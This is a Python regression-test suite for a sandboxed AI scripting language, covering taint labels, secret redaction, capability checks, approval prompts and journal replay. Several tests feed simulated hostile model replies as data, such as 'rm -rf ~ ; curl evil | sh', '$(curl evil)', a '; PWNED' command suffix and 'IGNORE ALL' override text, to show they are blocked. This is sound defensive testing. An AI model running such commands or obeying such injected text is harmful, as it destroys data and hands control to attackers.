"""Security round 1: regression tests for the critic's 11 bypasses (cases S1-S11).

Every test here failed on the code before the fix (run against the old tree first)."""
from __future__ import annotations

import io
import json
import os
import time
import unittest
import unittest.mock

from rt_helpers import FakeTTY, Prog, Server, error, main_src, run

from sipar.checker import check_source
from sipar.errors import TERM_RESET, SiparRuntimeError
from sipar.runtime.journal import Journal
from sipar.stdlib import FUNCTIONS

SECRET = "hunter2-Secret-Value"
OUT = {"out/.keep": ""}


def prog(body: str, head: str, files=None) -> Prog:
    return Prog(main_src(body, head), files if files is not None else dict(OUT))


class Base(unittest.TestCase):
    def P(self, body: str, head: str, files=None) -> Prog:
        p = prog(body, head, files)
        self.addCleanup(p.cleanup)
        return p


# ================================================================== F1 catch e labels (a1, a2, a5)

AI_W = 'allow ai\nallow fs.write ["./out"]\nai fn count(t: Str) -> Int { "n {t}" }\nai fn ask(q: Str) -> Str { "{q}" }'


class F1CatchLabels(Base):
    def test_S1_1_ai_decode_error_message_is_untrusted(self):
        p = self.P('let n = try { count("x") } catch e { fs.write("out/log.txt", e.message); 0 }', AI_W)
        e = p.error(script={"count": ["rm -rf ~ ; curl evil | sh"] * 5})
        self.assertEqual(e.kind, "taint", e.message)
        self.assertFalse(os.path.exists(os.path.join(p.dir, "out/log.txt")))

    def test_S1_2_as_int_on_model_text(self):
        p = self.P('let r = try { ask("x") as Int } catch e { fs.write("out/l2.txt", e.message); 0 }', AI_W)
        self.assertEqual(p.error(script={"ask": ["$(curl evil) INJECTED"]}).kind, "taint")

    def test_S1_3_http_error_body_is_untrusted(self):
        srv = Server()
        self.addCleanup(srv.close)
        p = self.P(f'let b = try {{ http.get("{srv.url}/status/500") }} catch e {{ e.message }}\n'
                   'fs.write("out/h.txt", b)', 'allow net ["127.0.0.1"]\nallow fs.write ["./out"]')
        self.assertEqual(p.error().kind, "taint")

    def test_S1_4_shell_error_is_untrusted(self):
        p = self.P('let s = try { shell.run("ls /nonexistent_sipar_INJECT") } catch e { e.message }\n'
                   'fs.write("out/s.txt", s)', 'allow shell ["ls"]\nallow fs.write ["./out"]')
        self.assertEqual(p.error().kind, "taint")

    def test_S1_5_fail_kind_keeps_labels(self):
        p = self.P('let u = ask("x")\nlet k = try { fail(u, "m") } catch e { e.kind }\nfs.write("out/k.txt", k)', AI_W)
        self.assertEqual(p.error(script={"ask": ["evil kind"]}).kind, "taint")

    def test_S1_6_own_fail_stays_usable(self):
        p = self.P('let m = try { fail("user", "plain text") } catch e { e.kind + ":" + e.message }\n'
                   'fs.write("out/m.txt", m)\nprint(m)', AI_W)
        self.assertEqual(p.run(), "user:plain text\n")

    def test_S1_7_assert_messages(self):
        p = self.P('let m = try { assert 1 == 2 } catch e { e.message }\nfs.write("out/a.txt", m)\nprint(m)\n'
                   'let n = try { assert 1 == 2, "own words" } catch e { e.message }\nfs.write("out/b.txt", n)\n'
                   'print(n)', AI_W)
        self.assertEqual(p.run(), "assertion failed\nown words\n")
        p = self.P('let u = ask("x")\nlet m = try { assert 1 == 2, u } catch e { e.message }\n'
                   'fs.write("out/a.txt", m)', AI_W)
        self.assertEqual(p.error(script={"ask": ["evil"]}).kind, "taint")

    def test_S1_8_builtin_kind_unlabelled(self):
        p = self.P('let k = try { 1 / 0 } catch e { e.kind }\nfs.write("out/k.txt", "{k}")\nprint(k)', AI_W)
        self.assertEqual(p.run(), "zero\n")

    def test_S1_9_fail_untrusted_message_keeps_label(self):
        p = self.P('let u = ask("x")\nlet m = try { fail("k", u) } catch e { e.message }\nfs.write("out/m.txt", m)', AI_W)
        self.assertEqual(p.error(script={"ask": ["evil"]}).kind, "taint")


# ================================================================== F2 central secret redaction (a3, a15, a5 journal)

RED = 'allow secret ["TOK", "PIN"]\nallow net ["127.0.0.1"]\nenum Mood { happy, sad }\ntype Box = { n: Int }'


def no_secret(tc, text, secret=SECRET):
    for form in (secret, secret.upper(), secret.lower()):
        tc.assertNotIn(form, text)


class F2Redaction(Base):
    def test_S2_1_raw_secret_in_any_error_message(self):
        # a producer that embeds raw text: urllib's header validation (value with a newline)
        e = SiparRuntimeError("io", f"bad header {SECRET} / {SECRET.upper()} / {SECRET.lower()}")
        from sipar.errors import register_secret
        register_secret(SECRET, "secret:TOK")
        no_secret(self, e.message)
        no_secret(self, str(e))
        self.assertIn("«secret:TOK»", e.message)

    def test_S2_2_decode_of_secret_as_enum_list_or_record(self):
        for expr in ['("[\\"" + k + "\\"]") as List[Mood]', '("\\{\\"n\\": \\"" + k + "\\"\\}") as Box',
                     'k as Int', 'k as Float', 'k as Bool', '("[" + k + "]") as List[Int]']:
            with self.subTest(expr=expr):
                # round 5 S1f: e.message of an error built from a secret is secret-labelled, so print is blocked
                p = self.P(f'let k = env.secret("TOK")\nlet m = try {{ let x = {expr}\n "ok" }} catch e {{ e.message }}\n'
                           'print(m)', RED)
                e = p.error(env={"TOK": "zq" + SECRET[2:]})
                self.assertEqual(e.kind, "taint")
                no_secret(self, e.message, "zq" + SECRET[2:])
                e = self.P(f'let k = env.secret("TOK")\nlet x = {expr}', RED).error(env={"TOK": "zq" + SECRET[2:]})
                no_secret(self, e.message, "zq" + SECRET[2:])       # the error itself is redacted

    def test_S2_2b_short_secret_decode_hidden(self):
        for expr in ['("[\\"" + k + "\\"]") as List[Mood]', '("[" + k + "]") as List[Int]', 'k as Int',
                     '("\\{\\"n\\": \\"" + k + "\\"\\}") as Box']:
            with self.subTest(expr=expr):
                p = self.P(f'let k = env.secret("PIN")\nlet m = try {{ let x = {expr}\n "ok" }} catch e {{ e.message }}\n'
                           'print(m)', RED)
                self.assertEqual(p.error(env={"PIN": "q9z"}).kind, "taint")      # round 5 S1f
                e = self.P(f'let k = env.secret("PIN")\nlet x = {expr}', RED).error(env={"PIN": "q9z"})
                self.assertNotIn("q9z", e.message)
                self.assertIn("«secret:PIN»", e.message)

    def test_S2_3_index_error_with_short_secret_int(self):
        p = self.P('let pin = env.secret("PIN") as Int\nlet xs = [1, 2, 3]\n'
                   'let m = try { "{xs[pin]}" } catch e { e.message }\nprint(m)', RED)
        self.assertEqual(p.error(env={"PIN": "7"}).kind, "taint")      # round 5 S1f: e.message is secret
        e = self.P('let pin = env.secret("PIN") as Int\nlet xs = [1, 2, 3]\nprint("{xs[pin]}")', RED).error(
            env={"PIN": "7"})
        self.assertIn("«secret:PIN»", e.message)
        self.assertNotIn("7", e.message)

    def test_S2_4_tool_error_text_fed_to_model(self):
        from sipar.runtime.providers import MockProvider
        head = (RED + '\nallow ai\nfn probe(x: Str) -> Str uses secret {\n let k = env.secret("TOK")\n'
                ' let y = ("[\\"" + k + "\\"]") as List[Mood]\n "ok"\n}\n'
                'agent fn helper(goal: Str) -> Str uses secret { tools [probe]\n "Goal: {goal}" }')
        mock = MockProvider({"helper": [{"tool": "probe", "args": {"x": "a"}}, {"final": "done"}]})
        j = Journal()
        out = self.P('print(helper("go"))', head).run(env={"TOK": SECRET}, providers={"mock": mock}, journal=j)
        self.assertEqual(out, "done\n")
        fed = json.dumps([c["messages"] for c in mock.calls])
        self.assertIn("probe failed", fed)
        no_secret(self, fed)
        no_secret(self, json.dumps(j.entries))

    def test_S2_5_journal_entries(self):
        srv = Server()
        self.addCleanup(srv.close)
        j = Journal()
        p = self.P(f'let k = env.secret("TOK")\nlet r = http.post("{srv.url}/echo", "hello", '
                   'headers: ["Authorization": k.upper()])\nprint("ok")', RED)
        p.run(env={"TOK": SECRET}, journal=j)
        no_secret(self, json.dumps(j.entries))

    def test_S2_6_cli_render_of_error(self):
        from sipar.errors import register_secret
        register_secret(SECRET, "secret:TOK")
        e = SiparRuntimeError("io", f"x {SECRET.lower()}", 3, 1, "f.sipar")
        no_secret(self, e.render() if hasattr(e, "render") else str(e))


# ================================================================== F3 allow env / allow secret (a20, a13b)

class F3SecretCap(Base):
    def test_S3_1_secret_needs_allow_secret(self):
        e = self.P('print(env.secret("TOK") == "x")', 'allow env ["TOK"]').error(env={"TOK": SECRET})
        self.assertEqual(e.kind, "capability")
        self.assertIn("allow secret", e.message)
        out = self.P('print(env.secret("TOK") == "x")', 'allow secret ["TOK"]').run(env={"TOK": SECRET})
        self.assertEqual(out, "false\n")

    def test_S3_2_env_get_of_a_secret_name_refused(self):
        e = self.P('print(env.get("TOK") ?? "")', 'allow env ["TOK"]\nallow secret ["TOK"]').error(env={"TOK": SECRET})
        self.assertEqual(e.kind, "capability")
        self.assertNotIn(SECRET, e.message)

    def test_S3_2_agent_tool_cannot_read_secret_by_env_get(self):
        head = ('allow ai\nallow env ["TOK", "LANG"]\nallow secret ["TOK"]\n'
                'fn get_setting(name: Str) -> Str uses env { env.get(name) ?? "" }\n'
                'agent fn helper(goal: Str) -> Str uses env { tools [get_setting]\n "Goal: {goal}" }')
        p = self.P('let k = env.secret("TOK")\nprint(helper("lang?"))', head)
        script = {"helper": [{"tool": "get_setting", "args": {"name": "TOK"}}, {"final": "done"}]}
        j = Journal()
        e = p.error(script=script, env={"TOK": SECRET}, journal=j)
        self.assertEqual(e.kind, "capability")             # capability errors stop the agent
        self.assertIn("allow secret", e.message)
        self.assertNotIn(SECRET, json.dumps(j.entries) + p.out)

    def test_S3_3_checker(self):
        def codes(src):
            return [d.code for d in check_source(src)[1] if d.severity == "error"]
        ok = 'allow secret ["TOK"]\nfn main() uses secret { let k = env.secret("TOK") }\n'
        self.assertEqual(codes(ok), [])
        self.assertIn("E301", codes('allow secret ["TOK"]\nallow env ["TOK"]\n'
                                    'fn main() uses env { let k = env.secret("TOK") }\n'))
        self.assertIn("E302", codes('allow env ["TOK"]\nfn main() uses secret { let k = env.secret("TOK") }\n'))
        self.assertIn("E306", codes('allow secret\nfn main() uses secret { let k = env.secret("TOK") }\n'))

    def test_S3_4_env_get_still_works(self):
        out = self.P('print(env.get("PLAIN") ?? "-")', 'allow env ["PLAIN"]\nallow secret ["TOK"]').run(
            env={"PLAIN": "v1"})
        self.assertEqual(out, "v1\n")


# ================================================================== F4 approve shows everything (a12)

class F4Approve(Base):
    def test_S4_1_full_value_and_length_shown(self):
        val = "echo harmless " + "A" * 2014 + " ; PWNED"
        p = self.P('let c = ask("x")\nlet ok = approve(c, "Run?")\nprint(ok.len())',
                   'allow ai\nallow io\nai fn ask(q: Str) -> Str { "{q}" }')
        out = p.run(script={"ask": [val]}, stdin=FakeTTY("y\n"))
        self.assertEqual(out, f"{len(val)}\n")
        shown = p.stderr.getvalue()
        self.assertIn("PWNED", shown)
        self.assertIn(f"{len(val)} chars", shown)
        self.assertEqual(shown.replace("\n         ", "").count("A" * 2014), 1)

    def test_S4_2_control_chars_escaped(self):
        p = self.P('let c = ask("x")\nlet ok = approve(c, "Run?")',
                   'allow ai\nallow io\nai fn ask(q: Str) -> Str { "{q}" }')
        p.run(script={"ask": ["a\x1b[2Kb"]}, stdin=FakeTTY("y\n"))
        err = p.stderr.getvalue()
        self.assertTrue(err.startswith(TERM_RESET))      # round 5 S3d: approve resets the terminal first
        self.assertIn("\\x1b", err)
        self.assertNotIn("\x1b", err[len(TERM_RESET):])


# ================================================================== F5 default-deny secrets (a3)

SEC = 'allow secret ["TOK"]\nallow fs.read ["./data"]\nallow env ["X"]\nallow random\nallow time\nallow io\n' \
      'allow memory\nallow net ["127.0.0.1"]'


class F5DefaultDeny(Base):
    def test_S5_1_every_effectful_param(self):
        bodies = ['fs.read("data/" + k)', 'fs.exists("data/" + k.lower())', 'env.get(k)',
                  'random.int(k.len() * 1000, 1)', 'sleep(k.len() * 0)', 'input(k)', 'approve(k, "q")',
                  'approve("v", "q {k}")', 'memory.load(k)', 'memory.delete(k)']
        for b in bodies:
            with self.subTest(body=b):
                p = self.P(f'let k = env.secret("TOK")\nlet x = {b}', SEC, {"data/x": ""})
                e = p.error(env={"TOK": SECRET}, stdin=FakeTTY("y\n"))
                self.assertEqual(e.kind, "taint", (b, e.kind, e.message))
                self.assertNotIn(SECRET, e.message)
                self.assertNotIn(SECRET.upper(), e.message)
                self.assertNotIn(SECRET.lower(), e.message)

    def test_S5_2_headers_still_accept_secrets(self):
        srv = Server()
        self.addCleanup(srv.close)
        out = self.P(f'let k = env.secret("TOK")\nlet r = http.get("{srv.url}/echo", headers: ["Authorization": k])\n'
                     'print("ok")', SEC).run(env={"TOK": SECRET})
        self.assertEqual(out, "ok\n")
        self.assertEqual(srv.hits[-1]["headers"].get("Authorization"), SECRET)
        e = self.P(f'let k = env.secret("TOK")\nlet r = http.get("{srv.url}/echo", headers: [k: "v"])', SEC).error(
            env={"TOK": SECRET})
        self.assertEqual(e.kind, "taint")

    def test_S5_3_rule_is_structural(self):
        for name, sig in FUNCTIONS.items():
            if sig.effects:
                with self.subTest(fn=name):
                    want = {p for p, _ in sig.params} - {"headers"}
                    self.assertEqual(set(sig.no_secret), want)


# ================================================================== F6 provider usage + malformed replies (a8)

AI_S = 'allow ai\nai fn ask(q: Str) -> Str { "{q}" }'


class F6Provider(Base):
    def setUp(self):
        self.srv = Server()
        self.addCleanup(self.srv.close)
        self.env = {"SIPAR_MODEL": "openrouter/t/m", "SIPAR_OPENROUTER_URL": self.srv.url,
                    "OPENROUTER_API_KEY": "test-key-not-real"}

    def reply(self, content, usage="__none__"):
        r = {"choices": [{"message": {"role": "assistant", "content": content}}]}
        if usage != "__none__":
            r["usage"] = usage
        return r

    def test_S6_1_bad_usage_is_estimated_and_budget_holds(self):
        bad = [{"prompt_tokens": -100000, "completion_tokens": -100000},
               {"prompt_tokens": "-5", "completion_tokens": "-5"},
               {"prompt_tokens": True, "completion_tokens": True},
               {"prompt_tokens": 1.5, "completion_tokens": 0.5},
               {"prompt_tokens": 10 ** 30, "completion_tokens": 10 ** 30},
               "nope", None, "__none__"]
        for u in bad:
            with self.subTest(usage=u):
                self.srv.chat_reply = self.reply("x" * 400, u)
                p = self.P('let v = try { budget(tokens: 50) { ask("a") } } catch e { e.kind }\nprint(v)', AI_S)
                self.assertEqual(p.run(env=self.env), "budget\n")
        self.srv.chat_reply = self.reply("ok", {"prompt_tokens": 3, "completion_tokens": 1})
        self.assertEqual(self.P('print(budget(tokens: 50) { ask("a") })', AI_S).run(env=self.env), "ok\n")

    def test_S6_2_malformed_reply_is_ai_error(self):
        for r in [{"choices": [{"message": "just a string"}]}, {"choices": []}, {"choices": "x"},
                  {"choices": [{"message": {"content": {"a": 1}}}]}, {"choices": [{"message": {"content": 5}}]},
                  [1, 2], "str", None, {"choices": [{"message": {"content": [{"text": 5}]}}]},
                  {"error": 5}, {"error": {"message": None}}]:
            with self.subTest(reply=r):
                self.srv.chat_reply = r
                p = self.P('let v = try { ask("a") } catch e { e.kind }\nprint(v)', AI_S)
                self.assertEqual(p.run(env=self.env), "ai\n")

    def test_S6_3_custom_provider_bad_usage_and_crash(self):
        class Bad:
            def __init__(self, usage=None, boom=None, text="y" * 400):
                self.usage, self.boom, self.text = usage, boom, text

            def complete(self, messages, model, temperature, timeout, hint):
                if self.boom:
                    raise self.boom
                return self.text, self.usage

        for u in [{"input": -10 ** 6, "output": -10 ** 6}, {"input": "1", "output": "1"}, None, [], {}]:
            with self.subTest(usage=u):
                p = self.P('let v = try { budget(tokens: 50) { ask("a") } } catch e { e.kind }\nprint(v)', AI_S)
                self.assertEqual(p.run(env={"SIPAR_MODEL": "mock"}, providers={"mock": Bad(u)}), "budget\n")
        for prov in [Bad(boom=KeyError("x")), Bad(boom=ValueError("x")), Bad(text=None, usage={}),
                     Bad(text=5, usage={})]:
            with self.subTest(provider=prov.boom or prov.text):
                p = self.P('let v = try { ask("a") } catch e { e.kind }\nprint(v)', AI_S)
                self.assertEqual(p.run(env={"SIPAR_MODEL": "mock"}, providers={"mock": prov}), "ai\n")


# ================================================================== F7 decode / numeric hostility (a16, c.sipar)

NUM = ('allow ai\ntype R = { score: Float }\nai fn score(x: Str) -> R { "{x}" }\n'
       'ai fn count(x: Str) -> Int { "{x}" }\nai fn real(x: Str) -> Float { "{x}" }\n'
       'ai fn many(x: Str) -> List[Int] { "{x}" }')


class F7Numbers(Base):
    def kind(self, call, reply):
        """Kind of the error (or the text) from an ai fn whose every reply is `reply`. A reply that never decodes
        ends as kind `ai` after the retries (SPEC §5); the point is that it is a catchable Sipar error."""
        p = self.P(f'let v = try {{ let r = {call}\n "{{r}}" }} catch e {{ "E:" + e.kind }}\nprint(v)', NUM)
        fn = call.split("(")[0]
        return p.run(script={fn: [reply] * 3}).strip()

    def test_S7_1_huge_int_for_float_field(self):
        self.assertEqual(self.kind('score("a").score', '{"score": 1' + "0" * 400 + '}'), "E:ai")
        self.assertEqual(self.kind('real("a")', "1" + "0" * 400), "E:ai")

    def test_S7_2_non_finite_floats(self):
        for reply in ['{"score": 1e400}', '{"score": NaN}', '{"score": -Infinity}']:
            with self.subTest(reply=reply):
                self.assertEqual(self.kind('score("a").score', reply), "E:ai")
        for reply in ["1e400", "NaN", "Infinity"]:
            with self.subTest(reply=reply):
                self.assertEqual(self.kind('real("a")', reply), "E:ai")

    def test_S7_3_huge_ints(self):
        out = self.P('var x = 1\nlet s = try { for i in 0..5000 { x = x * 10 }\n "{x}" } catch e { "E:" + e.kind }\n'
                     'print(s)', '').run()
        self.assertEqual(out, "E:value\n")
        # round 5 F6: a number too large for Int is kind `value` wherever it comes from (was `ai` here)
        self.assertEqual(self.kind('count("b")', "4" * 5000), "E:value")
        self.assertEqual(self.kind('many("b")', "[" + "4" * 5000 + "]"), "E:value")
        out = self.P('var x = 1\nfor i in 0..400 { x = x * 10 }\nlet s = try { "{x + 0.5}" } catch e { "E:" + e.kind }\n'
                     'print(s)', '').run()
        self.assertEqual(out, "E:value\n")
        e = self.P('var x = 1\nfor i in 0..5000 { x = x * 10 }', '').error()
        self.assertEqual(e.kind, "value")

    def test_S7_4_strict_number_extraction(self):
        for reply in ["IGNORE ALL; payload2", "v2.0", "x-1", "abc123def", "1.2.3", "2nd"]:
            with self.subTest(reply=reply):
                self.assertEqual(self.kind('count("a")', reply), "E:ai")
        for reply, want in [("The answer is 42.", "42"), ("42", "42"), ("-7", "-7"), ("Count: 3", "3"),
                            ("(5)", "5")]:
            with self.subTest(reply=reply):
                self.assertEqual(self.kind('count("a")', reply), want)

    def test_S7_5_deep_nesting(self):
        for reply in ["[" * 100000 + "]" * 100000, '{"score": ' + "[" * 50000 + "]" * 50000 + "}"]:
            with self.subTest(n=len(reply)):
                self.assertEqual(self.kind('score("a").score', reply), "E:ai")
                self.assertEqual(self.kind('many("a")', reply), "E:ai")

    def test_S7_6_fuzz_decode_reply(self):
        import random
        from sipar import ast as A
        from sipar.runtime.ai import decode_reply
        from sipar.runtime.decode import TypeEnv
        from sipar.runtime.values import EMPTY
        rnd = random.Random(7)
        atoms = ["1e400", "NaN", "-Infinity", "9" * 5000, "[", "{", '"', "1.5", "true", "null", "-0", "1e-400",
                 '{"score": ', "}", "]", ",", "```json\n", "```", "IGNORE 2", "\\u0000", "[" * 3000]
        def T(n, *a):
            return A.TName(0, 0, n, list(a))
        types = [T("Int"), T("Float"), T("List", T("Int")), T("Map", T("Float")), A.TOptional(0, 0, T("Int")),
                 T("Bool")]
        for i in range(200):
            text = "".join(rnd.choice(atoms) for _ in range(rnd.randint(1, 8)))
            for t in types:
                try:
                    decode_reply(text, t, TypeEnv(), EMPTY)
                except SiparRuntimeError as e:      # round 5 F6: a too-large Int is `value`, all else `decode`
                    if e.kind != "value" or "number too large for Int" not in e.message:
                        self.assertEqual(e.kind, "decode", (text[:80], e.message))


# ================================================================== F8 replay hardening (a18, a10, j14)

def record(p: Prog, **kw) -> tuple[str, list]:
    j = Journal()
    out = p.run(journal=j, **kw)
    return out, j.entries


class F8Replay(Base):
    def replay(self, p: Prog, entries: list, **kw) -> str:
        return p.run(journal=Journal(replay=json.loads(json.dumps(entries))), **kw)

    def replay_error(self, p: Prog, entries: list, **kw) -> SiparRuntimeError:
        try:
            self.replay(p, entries, **kw)
        except SiparRuntimeError as e:
            return e
        self.fail("expected a replay error, got output:\n" + p.out)

    def test_S8_1_seconds_budget_reproduced_on_replay(self):
        p = self.P('var i = 0\nlet m = try { budget(seconds: 0.15) { while true { i = i + 1 }\n "no" } } '
                   'catch e { "[{e.kind}] {e.message}" }\nprint("{i} {m}")', '')
        out, entries = record(p)
        self.assertIn("[budget] time budget exceeded", out)
        self.assertEqual(self.replay(p, entries), out)

    def test_S8_1b_sleep_budget_reproduced_on_replay(self):
        p = self.P('let m = try { budget(seconds: 0.5) { sleep(0.2)\n sleep(0.4)\n "no" } } '
                   'catch e { "[{e.kind}]" }\nprint(m)', 'allow time')
        out, entries = record(p)
        self.assertEqual(out, "[budget]\n")
        t0 = time.monotonic()
        self.assertEqual(self.replay(p, entries), out)
        self.assertLess(time.monotonic() - t0, 0.15)            # replay does not sleep

    def test_S8_1c_replay_on_slow_machine_does_not_invent_a_budget_error(self):
        p = self.P('let m = try { budget(seconds: 0.3) { sleep(0.1)\n "ok" } } catch e { "[{e.kind}]" }\n'
                   'print(m)', 'allow time')
        out, entries = record(p)
        self.assertEqual(out, "ok\n")
        real = time.monotonic
        with unittest.mock.patch("time.monotonic", lambda: real() * 100000):   # a very slow replay
            self.assertEqual(self.replay(p, entries), out)

    SEC = 'allow secret ["API_KEY"]'
    SEC_BODY = 'let k = env.secret("API_KEY")\nif k.len() > 18 { print("long") } else { print("short") }'

    def test_S8_2_secret_reread_and_verified_on_replay(self):
        p = self.P(self.SEC_BODY, self.SEC)
        out, entries = record(p, env={"API_KEY": SECRET})
        self.assertEqual(out, "long\n")
        self.assertEqual(self.replay(p, entries, env={"API_KEY": SECRET}), "long\n")    # a10: not "short"
        for env in ({}, {"API_KEY": "short"}, {"API_KEY": SECRET[:-1] + "X"}):
            with self.subTest(env=list(env.values())):
                e = self.replay_error(p, entries, env=env)
                self.assertEqual(e.kind, "replay")
                self.assertNotIn(SECRET, e.message)

    def test_S8_3_journal_has_no_secret_text(self):
        p = self.P(self.SEC_BODY, self.SEC)
        _, entries = record(p, env={"API_KEY": SECRET})
        text = json.dumps(entries)
        for form in (SECRET, SECRET.upper(), SECRET.lower()):
            self.assertNotIn(form, text)
        r = entries[0]["response"]
        self.assertEqual(r["len"], len(SECRET))

    def test_S8_3b_short_secret_hash_not_scrubbed(self):
        """The recorded hash is hex; a hex-looking secret must not be redacted out of it."""
        p = self.P(self.SEC_BODY, self.SEC)
        for v in ("abcd", "0123", "ffff"):
            with self.subTest(v=v):
                _, entries = record(p, env={"API_KEY": v})
                self.assertEqual(self.replay(p, entries, env={"API_KEY": v}), "short\n")

    BAD = [
        ("time", 'allow time', 'print(time.now())', ["abc", {"x": 1}, None, True, [1], 1e999]),
        ("random", 'allow random', 'print(random.int(1, 6))', [7, 0, "3", 2.5, True, None]),
        ("http", 'allow net ["127.0.0.1"]', 'print(http.get("http://127.0.0.1:1/x"))', [3, None, {"a": 1}]),
        ("env.get", 'allow env ["HOME"]', 'print(env.get("HOME") ?? "-")', [3, ["a"], {"a": 1}]),
        ("fs.exists", 'allow fs.read ["."]', 'print(fs.exists("a"))', ["yes", 1, None]),
        ("approve", 'allow io', 'print(approve("v", "q"))', ["y", 1, None]),
        ("input", 'allow io', 'print(input("q"))', [3, None, ["a"], {"a": 1}]),
        ("memory.load", 'allow memory', 'let m: Int? = memory.load("k")\nprint(m ?? 0)',
         ["x", 3, {}, {"value": 1}, {"value": 1, "labels": "x"}]),
    ]

    def test_S8_4_malformed_responses(self):
        from sipar.checker import check
        for kind, head, body, bads in self.BAD:
            p = self.P(body, head)
            check(p.program, p.src)
            entry = {"seq": 1, "kind": kind, "request": None, "response": None, "labels": []}
            j = Journal()
            try:
                p.run(journal=j, stdin=io.StringIO("y\n"))
            except SiparRuntimeError:
                pass
            entry["request"] = j.entries[0]["request"]
            for bad in bads:
                with self.subTest(kind=kind, bad=bad):
                    e = self.replay_error(p, [dict(entry, response=bad)])
                    self.assertEqual(e.kind, "replay", e.message)

    def test_S8_4b_malformed_errors(self):
        p = self.P('print(time.now())', 'allow time')
        base = {"seq": 1, "kind": "time", "request": {}, "response": None, "labels": []}
        for err in ["x", 3, ["io"], {"kind": "nope", "message": "m"}, {"kind": "io", "message": 3},
                    {"kind": "io"}, {"message": "m"}, True]:
            with self.subTest(err=err):
                e = self.replay_error(p, [dict(base, error=err)])
                self.assertEqual(e.kind, "replay", e.message)
        e = self.replay_error(p, [dict(base, error={"kind": "io", "message": "disk gone"})])
        self.assertEqual((e.kind, e.message), ("io", "disk gone"))     # a well-formed recorded error (guard)

    def test_S8_4c_j14_files(self):
        p = self.P('print(time.now())', 'allow time')
        for resp in ["abc", {"x": 1}]:
            e = self.replay_error(p, [{"seq": 1, "kind": "time", "request": {}, "response": resp, "labels": [],
                                       "t": 1794074652.154, "ms": 0.016, "fn": "main"}])
            self.assertEqual(e.kind, "replay")

    def test_S8_4d_secret_entry_malformed(self):
        p = self.P(self.SEC_BODY, self.SEC)
        _, entries = record(p, env={"API_KEY": SECRET})
        good = entries[0]["response"]
        for bad in ["«secret:API_KEY»", None, 3, {}, dict(good, len="20"), dict(good, salt=3),
                    dict(good, hash=None), dict(good, len=True)]:
            with self.subTest(bad=bad):
                e = self.replay_error(p, [dict(entries[0], response=bad)], env={"API_KEY": SECRET})
                self.assertEqual(e.kind, "replay", e.message)

    def test_S8_5_fuzz_hostile_responses(self):
        import random
        rnd = random.Random(11)
        src = ('let a = time.now()\nlet b = random.int(1, 3)\nlet c = env.get("HOME") ?? "-"\n'
               'let d = fs.exists("x")\nlet s = env.secret("API_KEY")\nlet r = ask("q")\n'
               'let m: List[Int]? = memory.load("k")\nlet ks = memory.keys()\nprint("{a} {b} {c} {d} {r}")')
        head = ('allow time\nallow random\nallow env ["HOME"]\nallow fs.read ["."]\nallow secret ["API_KEY"]\n'
                'allow ai\nallow memory\nai fn ask(q: Str) -> Str { "{q}" }')
        p = self.P(src, head)
        from sipar.checker import check
        check(p.program, p.src)                 # annotates memory.load with its type (errors do not matter here)
        _, entries = record(p, env={"API_KEY": SECRET})
        hostile = [None, True, -1, 1e308, "x", [], {}, [None], {"text": 3}, {"text": "t", "usage": "u"},
                   {"value": [1], "labels": "x"}, {"value": "x", "labels": []}, {"x": {"y": []}}, "9" * 5000]
        for i in range(120):
            es = json.loads(json.dumps(entries))
            k = rnd.randrange(len(es))
            es[k]["response"] = rnd.choice(hostile)
            if rnd.random() < 0.3:
                es[k]["error"] = rnd.choice(hostile)
            try:
                self.replay(p, es, env={"API_KEY": SECRET})
            except SiparRuntimeError:
                pass



# ================================================================== F9 whole-request deadline (a11)

class F9Deadline(Base):
    def setUp(self):
        self.srv = Server()
        self.addCleanup(self.srv.close)

    def timed(self, p: Prog, **kw) -> tuple[str, float]:
        t0 = time.monotonic()
        out = p.run(**kw)
        return out, time.monotonic() - t0

    def test_S9_1_dripping_server_vs_seconds_budget(self):
        p = self.P(f'let m = try {{ budget(seconds: 1) {{ http.get("{self.srv.url}/slow?n=30") }} }} '
                   'catch e { "[{e.kind}] {e.message}" }\nprint(m)', 'allow net')
        out, dt = self.timed(p)
        self.assertTrue(out.startswith("[budget] time budget exceeded"), out)
        self.assertLess(dt, 2.0)

    def test_S9_2_dripping_server_vs_http_timeout(self):
        p = self.P(f'let m = try {{ http.get("{self.srv.url}/slow?n=30") }} catch e {{ "[{{e.kind}}] {{e.message}}" }}'
                   '\nprint(m)', 'allow net')
        out, dt = self.timed(p, env={"SIPAR_HTTP_TIMEOUT": "1"})
        self.assertTrue(out.startswith("[io] GET 127.0.0.1"), out)
        self.assertIn("timed out after 1s", out)
        self.assertLess(dt, 2.0)

    def test_S9_2b_fast_server_unaffected(self):
        p = self.P(f'print(http.get("{self.srv.url}/slow?n=2"))', 'allow net')
        self.assertEqual(p.run(env={"SIPAR_HTTP_TIMEOUT": "5"}), "  \n")      # finishes inside the deadline

    def test_S9_3_shell_command_vs_seconds_budget(self):
        # the grandchild keeps the output pipe open: killing only the child would still hang
        p = self.P('let m = try { budget(seconds: 0.5) { shell.run("sh -c \'sleep 4 & sleep 4\'") } } '
                   'catch e { "[{e.kind}] {e.message}" }\nprint(m)', 'allow shell ["sh"]')
        out, dt = self.timed(p)
        self.assertTrue(out.startswith("[budget] time budget exceeded: command 'sh'"), out)
        self.assertLess(dt, 2.0)

    def test_S9_3b_shell_timeout_kills_grandchildren(self):
        p = self.P('let m = try { shell.run("sh -c \'sleep 30 & echo $! > gc.pid; sleep 30\'") } catch e { e.message }'
                   '\nprint(m)', 'allow shell ["sh"]')
        out, dt = self.timed(p, env={"SIPAR_SHELL_TIMEOUT": "0.5"})
        self.assertEqual(out, "command 'sh' timed out after 0.5s\n")
        self.assertLess(dt, 2.5)
        with open(os.path.join(p.dir, "gc.pid")) as fh:
            pid = int(fh.read())
        alive = True
        for _ in range(40):                    # the killed orphan is reaped by init shortly after
            try:
                os.kill(pid, 0)
            except ProcessLookupError:
                alive = False
                break
            time.sleep(0.05)
        if alive:
            os.kill(pid, 9)                    # do not leave it behind, then fail
        self.assertFalse(alive, "the background child of the timed-out command is still running")

    def test_S9_4_dripping_model_server(self):
        self.srv.chat_drip = True
        env = {"SIPAR_MODEL": "openrouter/t/m", "SIPAR_OPENROUTER_URL": self.srv.url,
               "OPENROUTER_API_KEY": "test-key-not-real"}
        p = self.P('let m = try { ask("a") } catch e { "[{e.kind}] {e.message}" }\nprint(m)', AI_S)
        out, dt = self.timed(p, env=dict(env, SIPAR_AI_TIMEOUT="1"))
        self.assertTrue(out.startswith("[ai]") and "timed out" in out, out)
        self.assertLess(dt, 2.0)
        p = self.P('let m = try { budget(seconds: 1) { ask("a") } } catch e { "[{e.kind}] {e.message}" }\nprint(m)',
                   AI_S)
        out, dt = self.timed(p, env=env)
        self.assertTrue(out.startswith("[budget] time budget exceeded"), out)
